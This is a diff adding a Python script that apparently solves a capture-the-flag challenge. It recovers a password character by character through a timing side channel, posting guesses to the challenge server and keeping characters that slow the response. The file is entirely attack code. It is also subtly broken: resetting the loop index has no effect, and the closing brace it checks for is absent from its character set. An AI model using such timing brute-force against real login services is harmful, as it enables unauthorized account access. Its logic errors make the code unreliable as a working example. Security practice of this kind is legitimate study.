@@ -1,0 +1,26 @@
+import requests
+import datetime
+
+URL="https://networked-password.web.chal.hsctf.com/"
+charset="_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%*-'"
+flag="hsctf{"
+
+DATA={'password':flag}
+r=requests.post(url=URL,data=DATA)
+realtime=r.elapsed.total_seconds()
+print("The Current Time:"+str(realtime)) # printing for debugging
+
+for i in range(len(charset)):
+    DATA={'password':flag+charset[i]}
+    r=requests.post(url=URL,data=DATA)
+    nexttime=r.elapsed.total_seconds()
+    print("[+]Testing:"+str(nexttime))   # printing for debugging
+    if(realtime+0.4<nexttime):
+        realtime=nexttime
+        if(charset[i]=='}'):
+            print("The final flag is"+flag )
+            exit(0)
+        flag+=charset[i]
+        print("Current flag->"+ flag)
+        i=0
+exit(0)
